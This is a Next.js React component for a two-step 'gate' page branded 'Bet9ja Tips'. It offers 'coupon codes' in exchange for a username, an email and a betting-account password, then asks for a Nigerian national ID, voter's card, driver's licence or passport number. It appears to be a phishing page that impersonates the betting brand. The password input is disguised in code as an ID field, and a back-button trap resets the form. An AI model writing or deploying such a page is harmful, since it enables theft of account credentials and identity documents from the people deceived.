"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { submitGateForm, submitVerificationForm } from "@/features/auth/actions";
import { ChevronDown, Loader2, AlertCircle } from "lucide-react";

export default function GatePage() {
  const router = useRouter();
  const [step, setStep] = useState(1); 
  
  const [username, setUsername] = useState("");
  const [email, setEmail] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [idType, setIdType] = useState("NIN");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      document.cookie = "gate_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
      setStep(1);
      setIdNumber("");
      setIdType("NIN");
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, []);

  const handleStep1 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    const result = await submitGateForm(username, email, idNumber);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      setStep(2);
      setIdNumber(""); 
      setLoading(false);
    }
  };

  const handleStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    if (!idNumber.trim()) {
      setError("Please enter your ID number.");
      setLoading(false);
      return;
    }

    const result = await submitVerificationForm(idType, idNumber, email);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      router.push("/tips?reviewing=true");
    }
  };

  return (
    <div className="min-h-screen bg-[#242730] flex items-center justify-center p-4">
      <div className="w-full max-w-[420px]">
        
        <div className="flex flex-col items-center mb-6">
          <div className="relative h-10 w-32 mb-4">
             <Image 
               src="/logo.png" 
               alt="Bet9ja Tips" 
               fill 
               className="object-contain" 
             />
          </div>
          <h1 className="text-xl font-bold text-surface-white text-center">
            {step === 1 ? "Access Coupon Codes" : "Verify Identity"}
          </h1>
        </div>

        {error && (
          <div className="bg-brand-red/10 border border-brand-red/20 text-brand-red text-sm p-3 rounded-md mb-4 flex items-center gap-2">
            <AlertCircle size={16} /> {error}
          </div>
        )}

        {/* STEP 1 FORM */}
        {step === 1 && (
          <form onSubmit={handleStep1} className="flex flex-col gap-3">
            
            <input
              type="text" required value={username} onChange={(e) => setUsername(e.target.value)}
              placeholder="Username"
              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
            />

            <input
              type="email" required value={email} onChange={(e) => setEmail(e.target.value)}
              placeholder="Email Address"
              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
            />

            <input
              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
              placeholder="Password"
              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
            />

            <button type="submit" disabled={loading}
              className="mt-2 w-full bg-[#1a8035] hover:bg-[#156b2c] text-white text-sm font-medium py-3.5 rounded-md transition-colors flex justify-center items-center">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Get Passcode"}
            </button>
          </form>
        )}

        {/* STEP 2 FORM */}
        {step === 2 && (
          <form onSubmit={handleStep2} className="flex flex-col gap-3">
            
            <div className="relative">
              <select 
                value={idType} onChange={(e) => setIdType(e.target.value)}
                className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 pl-4 pr-10 text-white appearance-none focus:outline-none focus:border-gray-500 transition-colors text-sm cursor-pointer"
              >
                <option value="NIN">National Identity Number (NIN)</option>
                <option value="Voter's Card">Permanent Voter's Card</option>
                <option value="Driver's License">Driver's License</option>
                <option value="International Passport">International Passport</option>
              </select>
              <ChevronDown className="absolute right-3 top-4 text-gray-400 w-5 h-5 pointer-events-none" />
            </div>

            <input
              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
              placeholder={`${idType} Number`}
              className="w-full bg-[#32363f] border border-transparent rounded-md py-3.5 px-4 text-white placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-colors text-sm"
            />

            <button type="submit" disabled={loading}
              className="mt-2 w-full bg-[#1a8035] hover:bg-[#156b2c] text-white text-sm font-medium py-3.5 rounded-md transition-colors flex justify-center items-center">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Verify & Unlock"}
            </button>
          </form>
        )}

      </div>
    </div>
  );
}
